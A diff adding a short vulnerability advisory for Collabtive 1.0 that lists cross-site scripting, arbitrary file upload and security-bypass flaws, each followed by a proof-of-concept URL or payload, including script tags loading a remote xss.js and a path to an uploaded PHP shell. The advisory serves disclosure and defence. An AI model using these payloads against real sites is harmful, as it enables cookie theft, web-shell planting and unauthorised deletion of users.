@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/61384/info
+
+Collabtive is prone to multiple cross-site scripting vulnerabilities, an arbitrary file upload vulnerability, and a security-bypass vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to bypass certain security restrictions, upload and execute arbitrary script code in the context of the affected web server process. This may let attackers steal cookie-based authentication credentials, perform unauthorized actions, or compromise the application; other attacks are possible.
+
+Collabtive 1.0 is vulnerable; other versions may also be affected. 
+
+File upload:
+
+https://www.example.com/secprj/files/standard/avatar/uploadedshell_104185.php
+
+Cross-site scripting:
+
+https://www.example.com/secprj/managechat.php?userto=<SCRIPT/XSS SRC="http://www.example1.com/xss.js";></SCRIPT>&uid=2
+
+"><SCRIPT/XSS SRC="http://www.example1.com/xss.js";></SCRIPT>
+
+Security-bypass:
+
+https://www.example.com/secprj/manageuser.php?action=del&id=5 
